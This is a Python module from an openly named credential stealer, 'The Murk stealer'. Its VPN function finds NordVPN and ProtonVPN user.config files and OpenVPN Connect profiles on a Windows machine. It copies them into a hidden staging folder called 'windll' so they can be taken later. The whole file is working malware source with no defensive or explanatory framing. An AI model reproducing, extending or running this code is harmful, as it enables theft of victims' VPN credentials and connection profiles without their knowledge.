#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import glob
from shutil import copy

def VPN(data):
     
    local = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'

    directory = {
        'Nord VPN': local + '\\NordVPN\\',
        'Open VPN': appdata + '\\OpenVPN Connect\\profiles\\',
        'Proton VPN': local + '\\ProtonVPN\\'
    }
    
    logs = {}
    for key, value in directory.items():
        if os.path.exists(value):
            if key == 'Nord VPN':
                logs[key] = ''.join(glob.glob(value+"\\NordVPN.exe*"))+'\\'+os.listdir(''.join(glob.glob(value+"\\NordVPN.exe*")))[0] + '\\user.config'
            if key == 'Open VPN':
                logs[key] = value+os.listdir(value)[0]
            if key == 'Proton VPN':
                logs[key] = ''.join(glob.glob(value+"\\ProtonVPN.exe*"))+'\\'+os.listdir(''.join(glob.glob(value+"\\ProtonVPN.exe*")))[0] + '\\user.config'
    
    if logs:
            data.append("\n\n📡VPN")
            os.mkdir(rf'{local}\windll\Messengers\VPN')
            for key, value in logs.items():
                os.mkdir(rf'{local}\windll\Messengers\VPN/'+key+'\\')
                copy(value, rf'{local}\windll\Messengers\VPN/'+key+'\\')
    return data